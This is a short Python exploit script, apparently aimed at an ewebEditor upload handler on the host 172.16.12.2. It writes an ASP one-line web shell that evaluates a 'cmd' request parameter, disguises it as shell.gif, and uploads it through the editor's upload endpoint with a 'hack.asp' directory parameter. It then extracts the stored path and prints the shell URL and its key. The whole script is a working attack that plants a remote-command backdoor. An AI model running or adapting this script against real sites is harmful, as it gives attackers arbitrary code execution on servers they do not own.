import requests

key="cmd"

requests.get("http://172.16.12.2/admin/ewebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=hack.asp")

# 要上传的文件
f = open('shell.gif', 'w')
f.write('<%eval request("'+key+'")%>')
f.close()

f={'uploadfile':open('shell.gif','rb')}
r=requests.post("http://172.16.12.2/admin/ewebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=hack.asp",files=f).content
i=r.find(b"d('")
r=r[i+3:]
i=r.find(b"'")
print("URL: http://172.16.12.2"+r[:i].decode())
print("key is: "+key)